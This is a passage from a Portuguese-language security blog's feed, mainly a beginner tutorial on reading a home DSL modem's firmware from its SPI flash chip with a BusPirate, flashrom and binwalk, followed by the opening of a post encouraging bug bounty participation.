Maycon Vitali&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="hello" /><summary type="html">Hi guys. I am writing this first post to tell you I’m back to share some technical stuff and, for this reason, I am remaking both my personal site and the Hack N’ Roll one. Once the new layout is done (maybe the same of this site, because I’m not good with HTML+CSS), I will migrate the posts from the old site to the new one.</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Extração de Firmware usando SPI</title><link href="http://localhost:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html" rel="alternate" type="text/html" title="Embedded Hacking: Extração de Firmware usando SPI" /><published>2018-01-25T22:00:00-02:00</published><updated>2018-01-25T22:00:00-02:00</updated><id>http://localhost:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi</id><content type="html" xml:base="http://localhost:4000/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html">&lt;p&gt;O objetivo desse post é dar inicio a uma série de publicações sobre hacking de embedded devices. Apesar de eu não ser nenhum mestre nisso, acredito que já tenha feito experimentos o suficiente para ajudar aos iniciantes que tiveram pouco ou nenhum contato com hacking de dispositivos embarcados. E, como de praxe, uma das primeiras partes geralmente envolve a obtenção do firmware do dispositivo. E é sobre isso que iremos falar nesse post. Caso identifiquem algum erro basta entrar em contato comigo pelos comentários no final do post ou por qualquer um dos contatos disponíveis na barra lateral do site.&lt;/p&gt;

&lt;h2 id=&quot;o-que-é-um-firmware&quot;&gt;O que é um firmware?&lt;/h2&gt;

&lt;p&gt;Eu espero não ter que delongar muito sobre isso. Mas só para deixar claro, vamos ver o que é, e o que podemos ter em um firmware de um dispositivos embarcado.&lt;/p&gt;

&lt;p&gt;O firmware (também conhecido como software embarcado – &lt;em&gt;embedded software&lt;/em&gt;) é parte do sistema embarcado responsável por armazenar o software que irá executar e controlar todo o sistema. Presente em diversos dispositivos, os firmwares podem ser encontrados em processadores, em microcontroladores, na BIOS do seu computador, em impressoras e nos nossos tão preciosos modems domésticos. Basicamente qualquer dispositivo que não foi feito 100% em hardware precisa de um firmware para funcionar. E esse pequeno “programa” será nosso alvo de estudo de engenharia reversa para descoberta de vulnerabilidades.&lt;/p&gt;

&lt;p&gt;Quando fazemos o update do firmware de um dispositivo, podemos ter alguma funcionalidade completamente transparente para esse processo, onde simplesmente clicamos em algum botão e o firmware se atualiza sozinho. Porém, algumas vezes é necessários baixar um arquivo no site do fabricante/fornecedor e fazer o update manualmente através de uma ferramenta de auxílio. Essa ferramenta pode variar desde uma aplicação de celular até uma funcionalidade de atualização da própria versão atual do firmware.&lt;/p&gt;

&lt;p&gt;Mas o que temos nesse arquivo? Pois bem, abaixo seguem algumas coisas que podemos ter dentro desses arquivos. Mas, lembre-se que isso varia de firmware para firmware, ou seja, um firmware em questão pode ter nenhum ou todas as opções abaixo:&lt;/p&gt;

&lt;h4 id=&quot;bootloader&quot;&gt;Bootloader&lt;/h4&gt;

&lt;p&gt;Esse cara é o startup do dispositivo embarcado. Geralmente ele que é responsável por carregar na inicialização do aparelho e contém aquelas funcionalidades de “segurar algumas teclas” e entrar em algum menu de administração (ex: recovery). Basicamente, se você corromper seu dispositivo, mas o bootloader ainda estiver intacto, as chances de você recuperar seu aparelho é quase que certa. Para se ter uma ideia mais abrangente, o bootloader em um PC é chamado após o processo de teste de inicialização (power-on self-test - POST) e da inicialização da BIOS. Quem já utilizou o &lt;em&gt;GR&lt;/em&gt;and &lt;em&gt;U&lt;/em&gt;nifield &lt;em&gt;B&lt;/em&gt;ootloader (grub) ou o &lt;em&gt;LI&lt;/em&gt;nux &lt;em&gt;LO&lt;/em&gt;ader (lilo) sabe exatamente do que eu estou falando.&lt;/p&gt;

&lt;p&gt;Existem alguns tipos diferentes de Bootloader para embarcados, e eles possuem funcionalidades que podem danificar seu dispositivo, como a leitura e escrita diretamente na memória flash do aparelho (EEPROM). Porém, os dispositivos embarcados possuem, em sua grande maioria, o &lt;a href=&quot;https://www.denx.de/wiki/U-Boot&quot;&gt;Das U-Boot&lt;/a&gt;, um bootloader open source compatível com mais de uma dezena de arquiteturas. Entretanto, como o U-Boot é open source, é comum encontrar versões limitadas (sem funcionalidades) ou modificada dele sendo executada em alguns dispositivos.&lt;/p&gt;

&lt;p&gt;Só para fazer uma referência, em minha &lt;a href=&quot;/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money.html&quot;&gt;publicação sobre Bug Bounty&lt;/a&gt;, eu descrevo superficialmente como eu consegui danifica um equipamento após executar alguns comandos no bootloader do aparelho de maneira “despreocupada”.&lt;/p&gt;

&lt;p&gt;É importante ressaltar que muitas vezes a atualização do firmware não atualiza o bootloader do dispositivo, mas somente seu sistemas de arquivos (descrito logo abaixo).&lt;/p&gt;

&lt;h4 id=&quot;kernel&quot;&gt;Kernel&lt;/h4&gt;

&lt;p&gt;O kernel é o núcleo do sistema em execução e sim, muitos deles rodam uma versão mínima do kernel do linux para embarcados. Geralmente o kernel é armazenado em uma área específica da memória, que é chamada diretamente pelo bootloader através de algum comando, passando como argumento o endereço de onde está o kernel na memória.&lt;/p&gt;

&lt;p&gt;Como o kernel é um Linux para embarcados e ele é chamado pelo bootloader, é possível alterar parâmetros da inicialização e fazer algumas coisas simples, como desativar alguma feature ou enviar o console para uma porta serial (se não for default) de forma que consigamos acessar o console do kernel através de uma interface UART, por exemplo. Se for de interesse, essa comunicação com a interface serial pode ser detalhado em alguma publicação futura. Basta comentar sobre o interesse no campos de comentários no final da página.&lt;/p&gt;

&lt;h4 id=&quot;sistema-de-arquivos&quot;&gt;Sistema de Arquivos&lt;/h4&gt;

&lt;p&gt;O sistema de arquivos (File System) é responsável por ter tudo do sistema operacional em execução. Ele contém os arquivos de configuração, os binários das aplicações em execução, a aplicação web (se for o caso) etc.&lt;/p&gt;

&lt;p&gt;Ao acessar o sistema de arquivos durante uma pequisa por vulnerabilidades, é comum como primeiros passos procurar por usuários não documentados (&lt;a href=&quot;http://embeddedsw.net/doc/Embeddedsw_news_Undocumented_backdoor_account_in_dbltek_goip.html&quot;&gt;backdoor?&lt;/a&gt;), chaves privadas de criptografia hardcoded (&lt;a href=&quot;https://www.wired.com/2015/12/juniper-networks-hidden-backdoors-show-the-risk-of-government-backdoors/&quot;&gt;backdoorr??&lt;/a&gt;) ou algum outro mecanismo de autenticação (&lt;a href=&quot;http://securityaffairs.co/wordpress/18645/hacking/d-link-backdoor.html&quot;&gt;backdooorrrr???&lt;/a&gt;).&lt;/p&gt;

&lt;h4 id=&quot;memória-protegida&quot;&gt;Memória Protegida&lt;/h4&gt;

&lt;p&gt;Aqui fica um pouco difícil de explicar. Mas vamos tentar.&lt;/p&gt;

&lt;p&gt;O que estou chamando de memória protegida geralmente é mapeada a partir da imagem do firmware como uma partição somente leitura. Geralmente ela contém informações de configuração padrão que são utilizadas no caso do &lt;em&gt;reset&lt;/em&gt; do firmware para os padrões de fábrica, por exemplo.&lt;/p&gt;

&lt;h2 id=&quot;obtenção-do-firmware&quot;&gt;Obtenção do Firmware&lt;/h2&gt;

&lt;p&gt;Já sabemos quais as principais parte de um firmware e já podemos ter uma ideia do quão importante é obter o firmware no processo de hacking de algum dispositivo embarcado. Agora vamos ver de maneira geral alguns métodos que podemos utilizar para a obtenção do firmware:&lt;/p&gt;

&lt;h4 id=&quot;site-do-fabricante&quot;&gt;Site do fabricante&lt;/h4&gt;

&lt;p&gt;Esse sem dúvidas é a forma mais simples de se obter o firmware. Basta identificar o fabricante do dispositivo e verificar no site do mesmo se existe alguma versão do firmware disponível para download.&lt;/p&gt;

&lt;h4 id=&quot;processo-de-atualização&quot;&gt;Processo de Atualização&lt;/h4&gt;

&lt;p&gt;Essa forma de obtenção do firmware não a mais fácil mas também não é a das mais difíceis. Ela consiste basicamente em utilizar a &lt;em&gt;feature&lt;/em&gt; presente de atualização do firmware e tentar interceptar o tráfego diretamente no &lt;em&gt;gateway&lt;/em&gt; de saída, ou fazendo um ataque de &lt;a href=&quot;https://pt.wikipedia.org/wiki/Ataque_man-in-the-middle&quot;&gt;man-in-the-middle&lt;/a&gt; no aparelho. Algumas vezes será necessário instalar um certificado digital no aparelho (para interceptar HTTPS) ou até mesmo tentar fazer algum &lt;em&gt;downgrade attack&lt;/em&gt;, como o SSLStrip.&lt;/p&gt;

&lt;h4 id=&quot;extração-através-do-bootloader&quot;&gt;Extração através do Bootloader&lt;/h4&gt;

&lt;p&gt;Lembra-se que eu falei que o bootloader possui funcionalidades para leitura e escrita na memória flash? Então! Geralmente a memória flash é praticamente uma imagem idêntica ao firmware propriamente dito. Com isso, utilizando os comandos de leitura da memória (ex: &lt;a href=&quot;http://www.denx.de/wiki/view/DULG/UBootCmdGroupMemory#Section_5.9.2.5.&quot;&gt;md.b - memory display&lt;/a&gt;) é possível fazer um dump em hexadecimal da memória flash e, com um simples script em python, converter o hexa para o arquivo original.&lt;/p&gt;

&lt;h4 id=&quot;leitura-diretamente-da-memória-flash&quot;&gt;Leitura diretamente da memória Flash&lt;/h4&gt;

&lt;p&gt;Apesar de ser uma dos formas mais complexas de se obter o firmware, é a forma que possui assertividade em praticamente 100% dos casos. Ela pode ser considerada difícil por precisar de interação diretamente com o hardware porém, tendo um certo cuidado e o equipamento necessário, ela passa a ser a forma preferida de se obter o firmware de um dispositivo.&lt;/p&gt;

&lt;p&gt;Muitos dispositivos possuem para seu armazenamento uma memória flash (EEPROM) convencional. Essa memória geralmente tem 8 ou 16 pinos, e armazenado nela temos tudo o que precisamos. Então só precisamos extrair o conteúdo. Para isso é necessário abrir o aparelho, identificar a memória flash (fabricante e modelo), descobrir a pinagem dela (pela especificação/datasheet) e ler todo conteúdo dela (com o aparelho desligado, é claro).&lt;/p&gt;

&lt;p&gt;Vamos ver com mais detalhes como podemos fazer isso utilizando SPI.&lt;/p&gt;

&lt;h2 id=&quot;o-que-é-spi&quot;&gt;O que é SPI?&lt;/h2&gt;

&lt;p&gt;O &lt;em&gt;Serial Peripheral Interface&lt;/em&gt; (SPI) é uma interface de comunicação serial que permite a comunicação com diversos componentes. Nas memórias flash, essa interface de comunicação possibilita ao microcontrolador ler e gravar informações e, no nosso caso, nos possibilitará a extração completa da memória.&lt;/p&gt;

&lt;p&gt;A comunicação serial por SPI se dá basicamente através dos seguintes 4 canais:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Clock&lt;/strong&gt;: O clock é o pulso que será enviado para a memória com o objetivo de sincronizar e controlar a comunicação.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Serial In (SI)&lt;/strong&gt;: Esse canal é responsável por &lt;strong&gt;receber&lt;/strong&gt; dados de maneira serial (seguindo a frequência do clock)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Serial Out (SO)&lt;/strong&gt;: Semelhante ao anterior, porém responsável por &lt;strong&gt;enviar&lt;/strong&gt; dados de maneira serial.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Chip Select (CS)&lt;/strong&gt;: Esse sinal é responsável por habilitar o chip propriamente dito. Ele geralmente é ativo em nível lógico baixo, e sua nomenclatura vem como CS# ou como CS com um traço em cima.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;a-extração-do-firmware&quot;&gt;A Extração do Firmware&lt;/h2&gt;

&lt;p&gt;Nessa parte irei demonstrar na prática como foi possível extrair o firmware do meu modem doméstico da Vivo. No caso irei demonstrar o processo no modem &lt;strong&gt;MITRASTAR DSL-100HN-T1-NV&lt;/strong&gt;. Para isso foi utilizado o seguinte software e hardware:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;O modem da Mitrastar propriamente dito&lt;/li&gt;
  &lt;li&gt;Um &lt;a href=&quot;http://dangerousprototypes.com/docs/Bus_Pirate&quot;&gt;BusPirate&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Pinças de teste (pode utiliza uma &lt;a href=&quot;https://lista.mercadolivre.com.br/pin%C3%A7a-soic-8&quot;&gt;pinça SOIC8&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;O software &lt;a href=&quot;https://www.flashrom.org/Flashrom&quot;&gt;flashrom&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;O BusPirate é uma ferramenta hacker open-source desenvolvida pela &lt;a href=&quot;http://dangerousprototypes.com/&quot;&gt;Dangerous Prototypes&lt;/a&gt; e ele possui a capacidade de conversar com dispositivos eletrônicos, permitindo a programação de FPGAs, programação de microcontroladores, acesso à interface JTAG e, como no nosso caso, comunicação com memória flash.&lt;/p&gt;

&lt;p&gt;Como o BusPirate é um hardware não muito acessível, gostaria de deixar registrado que é possível fazer os mesmos procedimentos aqui &lt;a href=&quot;https://github.com/bibanon/Coreboot-ThinkPads/wiki/Hardware-Flashing-with-Raspberry-Pi&quot;&gt;utilizando um RaspberryPi&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Então! Temos nosso modem em mãos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/modem.png&quot; alt=&quot;Modem MITRASTAR DSL-100HN-T1-NV (VIVO)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A primeira coisa a fazer é abrir o modem e acessar sua placa de circuito. Nesse modelo o procedimento é bem simples, bastando desparafusar 4 parafusos na parte de baixo do modem e desencaixar com cuidado as duas partes de plástico, a de cima e a de baixo. Com isso temos acesso à placa do modem:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/MITRASTAR-board.png&quot; alt=&quot;Placa interna&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para identificar a memória flash que ele utiliza temos que começar procurando por chips que possuem 4 ou 8 pinos. Analisando esses chips com uma lupa (pra quem é ruim das vistas) e uma boa iluminação, é possível identificar o que tem escrito em cada um deles e, então, perguntar ao google mais detalhes sobre o que ele é.&lt;/p&gt;

&lt;p&gt;Procurando sobre cada possível candidato à memória flash visível na placa, foi possível identificar a MX25L12835F da Macronix, com capacidade de 16MB.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/MX25L12835F-chip.png&quot; alt=&quot;Memória Flash MX25L12835F&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tendo o modelo da memória flash, sem muita dificuldade foi possível achar a especificação(&lt;a href=&quot;http://datasheet.octopart.com/MX25L12835FZ2I-10G-Macronix-datasheet-14372549.pdf&quot;&gt;datasheet&lt;/a&gt;) da mesma. Essa documentação contém todas as informações referentes ao chip, inclusive sua pinagem, que é o que mais nos interessa:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/MX25L12835F-pinout.png&quot; alt=&quot;Pinagem da Flash MX25L12835F&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos ver o que temos no nosso chip e como iremos conecta-lo:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;CS#:&lt;/strong&gt; Esse é o &lt;em&gt;chip select&lt;/em&gt;, e ele é utilizado para ativar ou não o chip. Lembre-se que quando temos esse # no final da identificação significa que nosso pino será ATIVO em nível lógico zero. Então para ativar ele precisa estar em zero. Mas no caso só precisamos de ligá-lo ao pino CS do BusPirate.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;SI:&lt;/strong&gt; Esse pino é o Serial In, e deve ser ligado ao MOSI (&lt;em&gt;Master Out Slave In&lt;/em&gt;) do BusPirate, pois o nosso BusPirate será o mestre e a memória flash será o escravo.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;SO:&lt;/strong&gt; Semelhante ao pino SI, porém esse é o &lt;em&gt;Serial Out&lt;/em&gt; e deverá ser ligado no MISO (&lt;em&gt;Master In Slave Out&lt;/em&gt;) do BusPirate.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;SCLK:&lt;/strong&gt; O clock (sem mais), ligado no clock do BusPirate.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;WP#:&lt;/strong&gt; Esse pino significa Write Protection e, como o nome diz, ele é responsável por impedir a escrita no chip, habilitado somente a leitura. Porém, como já falado, o símbolo # no final da nomenclatura significa que esse pino é ativado em nível lógico zero.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;É importante ressaltar que não ligar um pino não significa que ele está em nível lógico zero. Na verdade ele fica em um estado chamado &lt;em&gt;floating&lt;/em&gt;, que não vamos entrar em detalhes aqui. Eu, particularmente, não precisei ligar esse pino. Mas para ativar o &lt;strong&gt;WP#&lt;/strong&gt; é recomendado que ele seja ligado no terra (GND) para garantir nível lógico zero e evitar que você escreva acidentalmente na sua memória flash.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;RESET#:&lt;/strong&gt; Não utilizamos esse pino, mas ele serve para dar um hardware reset na memória.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;VCC:&lt;/strong&gt; Nossa alimentação, que de acordo com o datasheet, é de +3V. Ligada ao 3V3 (3.3V) do BusPirate.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;GND:&lt;/strong&gt; Nosso aterramento, ligado ao ground (GND) do BusPirate.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como já identificamos as pinagens responsáveis pelo SPI, então agora, com o aparelho desligado, temos tudo para conectar o BusPirate diretamente na memória flash. Eu utilizei umas pinças de testes que possuo, mas o mesmo pode ser feito utilizando uma pinça SOIC8:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/buspirate-connected.png&quot; alt=&quot;BusPirate conectado na memória Flash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tendo tudo conectado, ligamos o BusPirate no computador e utilizamos o aplicativo &lt;em&gt;flashrom&lt;/em&gt; para testar a comunicação com a memória flash:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;maycon@DayOfDevil ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;flashrom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; buspirate_spi:dev&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/buspirate,spispeed&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1M
flashrom v0.9.9-r1955 on Linux 4.14.7-1-ARCH &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
flashrom is free software, get the &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;code at https://flashrom.org

Calibrating delay loop... OK.
Found Macronix flash chip &lt;span class=&quot;s2&quot;&gt;&quot;MX25L12805D&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16384 kB, SPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on buspirate_spi.
Found Macronix flash chip &lt;span class=&quot;s2&quot;&gt;&quot;MX25L12835F/MX25L12845E/MX25L12865E&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16384 kB, SPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on buspirate_spi.
Multiple flash chip definitions match the detected chip&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;MX25L12805D&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;MX25L12835F/MX25L12845E/MX25L12865E&quot;&lt;/span&gt;
Please specify which chip definition to use with the &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &amp;lt;chipname&amp;gt; option.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como é possível notar, o flashrom identificou nossa memória flash MX25L12835F com o identificador “MX25L12835F/MX25L12845E/MX25L12865E”.&lt;/p&gt;

&lt;p&gt;Apesar de ter utilizado o device &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/buspirate&lt;/code&gt;, esse device só existe por uma regra que adicionei no udev do meu sistema operacional. Caso esse device não existe no seu sistema, tente os padrões &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/ttyUSB0&lt;/code&gt; ou similar. Em caso de dúvidas conecte o BUsPirate na USB da máquina e utilize o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; para identificar se ele foi detectado corretamente e qual dispositivo está sendo associado à ele.&lt;/p&gt;

&lt;p&gt;Tendo identificado o dispositivo, agora basta utilizar o &lt;code class=&quot;highlighter-rouge&quot;&gt;flashrom&lt;/code&gt; para extrair o conteúdo da memória flash para um arquivo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;maycon@DayOfDevil ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;flashrom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; buspirate_spi:dev&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/buspirate,spispeed&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1M &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MX25L12835F/MX25L12845E/MX25L12865E&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; flash.dump
flashrom v0.9.9-r1955 on Linux 4.14.7-1-ARCH &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
flashrom is free software, get the &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;code at https://flashrom.org

Calibrating delay loop... OK.
Found Macronix flash chip &lt;span class=&quot;s2&quot;&gt;&quot;MX25L12835F/MX25L12845E/MX25L12865E&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16384 kB, SPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on buspirate_spi.
Reading flash... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

real    44m58.310s
user    0m2.127s
sys     0m3.399s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cronometrei o tempo para deixar claro que, apesar da memória ter somente 16MB de armazenamento, a leitura bit-a-bit dela levou cerca de 45 minutos. Então para memórias maiores (ex: 128MB) é esperado que o tempo de extração seja de horas e horas.&lt;/p&gt;

&lt;p&gt;Tendo nosso dump da memória flash, já é possível acessar as partes do firmware e partir para a engenharia reversa e análise de vulnerabilidade:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;maycon@DayOfDevil ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk flash.dump

DECIMAL       HEXADECIMAL     DESCRIPTION
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
26112         0x6600          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 107920 bytes
69600         0x10FE0         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 42848 bytes
197120        0x30200         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3482360 bytes
1372293       0x14F085        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6471498 bytes, 1385 inodes, blocksize: 131072 bytes, created: 2016-07-15 11:37:07
8389120       0x800200        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3482360 bytes
9564293       0x91F085        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6471498 bytes, 1385 inodes, blocksize: 131072 bytes, created: 2016-07-15 11:37:07

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que tenha gostado do post. Caso tenha gostado deixei seu like e eu poderei avaliar quais tipos de publicação são de maior interesse de vocês. Se tiverem alguma dúvida basta colocar nos comentários ou utilizar qualquer forma de contato disponível no menu lateral.&lt;/p&gt;

&lt;p&gt;Hack N’ Roll&lt;br /&gt;
Maycon Vitali&lt;/p&gt;

&lt;h2 id=&quot;bônus-oh-really&quot;&gt;Bônus: Oh Really?!?!&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/bonus-really.png&quot; alt=&quot;BusPirate conectado na memória Flash&quot; /&gt;&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><summary type="html">O objetivo desse post é dar inicio a uma série de publicações sobre hacking de embedded devices. Apesar de eu não ser nenhum mestre nisso, acredito que já tenha feito experimentos o suficiente para ajudar aos iniciantes que tiveram pouco ou nenhum contato com hacking de dispositivos embarcados. E, como de praxe, uma das primeiras partes geralmente envolve a obtenção do firmware do dispositivo. E é sobre isso que iremos falar nesse post. Caso identifiquem algum erro basta entrar em contato comigo pelos comentários no final do post ou por qualquer um dos contatos disponíveis na barra lateral do site.</summary></entry><entry xml:lang="br"><title type="html">Talk is cheap. Show me the money!</title><link href="http://localhost:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money.html" rel="alternate" type="text/html" title="Talk is cheap. Show me the money!" /><published>2018-01-21T22:00:00-02:00</published><updated>2018-01-21T22:00:00-02:00</updated><id>http://localhost:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money</id><content type="html" xml:base="http://localhost:4000/bug-bounty/2018/01/21/talk-is-cheap-show-me-the-money.html">&lt;p&gt;Esta primeira publicação tem como objetivo principal estimular e incentivar a participação de profissionais de segurança, hackers e entusiastas nos tão famigerados programas de recompensa por falhas; os chamados Bug Bounty Programs. Aqui não terá nada muito técnico, mas isso já está no TODO-List para publicações futuras.&lt;/p&gt;

&lt;h3 id=&quot;o-que-é-bug-bounty&quot;&gt;O que é Bug Bounty?&lt;/h3&gt;

&lt;p&gt;Pra quem não sabe o que é um &lt;code class=&quot;highlighter-rouge&quot;&gt;Bug Bounty&lt;/code&gt; Program, uma forma simples de explicar é que são projetos que te recompensam por descobrir vulnerabilidades e reportar de maneira &lt;strong&gt;ética&lt;/strong&gt; para o desenvolvedor/vendor do produto ou para quem usa o mesmo. Essas recompensas podem ser o conhecimento da descoberta, muitas vezes com nome e contato profissional divulgado no hall da fama; porém a recompensa também podem ser monetária; e é aí que tudo começa a ficar mais interessante.&lt;/p&gt;

&lt;p&gt;Existem diversas empresas que possuem seu programa de recompensa para falhas como o &lt;a href=&quot;https://pt-br.facebook.com/BugBounty/&quot;&gt;Facebook&lt;/a&gt;, &lt;a href=&quot;https://www.google.com/about/appsecurity/reward-program/&quot;&gt;Google&lt;/a&gt; ou &lt;a href=&quot;https://technet.microsoft.com/pt-br/library/dn425036.aspx&quot;&gt;Microsoft&lt;/a&gt;. Além do mais, existem plataformas que concentram dezenas de centenas de empresas diferentes, atuando como um intermediador, com é o caso do &lt;a href=&quot;https://www.hackerone.com/&quot;&gt;HackerOne&lt;/a&gt;, e outras empresas que aderem a programas de recompensa porém com o intuito de revender as falhas para outros órgãos (aka governos) ou adicionar a algum produto específico de segurança.&lt;/p&gt;

&lt;h3 id=&quot;critério-de-seleção&quot;&gt;Critério de Seleção&lt;/h3&gt;

&lt;p&gt;Eu vinha a um tempo já acompanhando relatórios de Bug Bounty que são publicados na plataforma da &lt;a href=&quot;https://www.hackerone.com/&quot;&gt;HackerOne&lt;/a&gt;, e sempre que via alguém ganhando alguns dólares reportando &lt;em&gt;XSS Reflected&lt;/em&gt; eu sempre pensava o mesmo: “Pultz! Bem que poderia ser eu”. Até que eu resolvi arregaçar as mangas e tentar a “sorte” em algum programa.&lt;/p&gt;

&lt;p&gt;Para a escolha do programa, eu avaliei alguns pontos analisando os reports públicos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Um programa que possuísse regras e escopo claro&lt;/li&gt;
  &lt;li&gt;A responsividade do vendor quando alguém reportava alguma falha&lt;/li&gt;
  &lt;li&gt;O valor médio pago por cada tipo de falha&lt;/li&gt;
  &lt;li&gt;Algo que não fosse extremamente obscuro de testar (queria algo acessível)&lt;/li&gt;
  &lt;li&gt;E, é claro, algo que eu considerasse extremamente divertido&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;escolhendo-o-vendor&quot;&gt;Escolhendo o Vendor&lt;/h3&gt;

